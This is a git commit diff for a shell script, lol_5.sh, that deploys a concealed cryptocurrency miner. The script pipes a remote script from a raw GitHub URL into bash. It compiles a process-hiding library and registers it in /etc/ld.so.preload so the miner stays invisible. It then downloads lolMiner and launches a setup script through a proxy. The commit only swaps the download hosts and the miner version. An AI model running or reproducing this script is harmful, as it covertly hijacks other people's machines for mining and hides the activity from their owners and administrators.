5a3b23d013965db47ad3cd4de75737f46911585d
17mei2022 <105721082+17mei2022@users.noreply.github.com>
2022-05-17 20:52:55 +0700

    Update lol_5.sh

--- lol_5.sh
+++ lol_5.sh
@@ -1,15 +1,15 @@
 #!/bin/sh
-wget -O - https://gitlab.com/WarungHejo/beta-01/-/raw/main/px_5.sh | bash
-wget https://gitlab.com/WarungHejo/beta-01/-/raw/main/magicLol.zip
+wget -O - https://raw.githubusercontent.com/17mei2022/No_lol/main/px_5.sh | bash
+wget https://github.com/17mei2022/No_lol/raw/main/magicLol.zip
 unzip magicLol.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
-tar -xvzf lolMiner_v1.34_Lin64.tar.gz
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.50/lolMiner_v1.50_Lin64.tar.gz
+tar -xvzf lolMiner_v1.50_Lin64.tar.gz
 rm .gitignore
-cd 1.34
-wget https://gitlab.com/WarungHejo/beta-01/-/raw/main/set_lol.sh
+cd 1.50
+wget https://raw.githubusercontent.com/17mei2022/No_lol/main/set_lol.sh
 chmod +x *.sh
 graftcp ./set_lol.sh
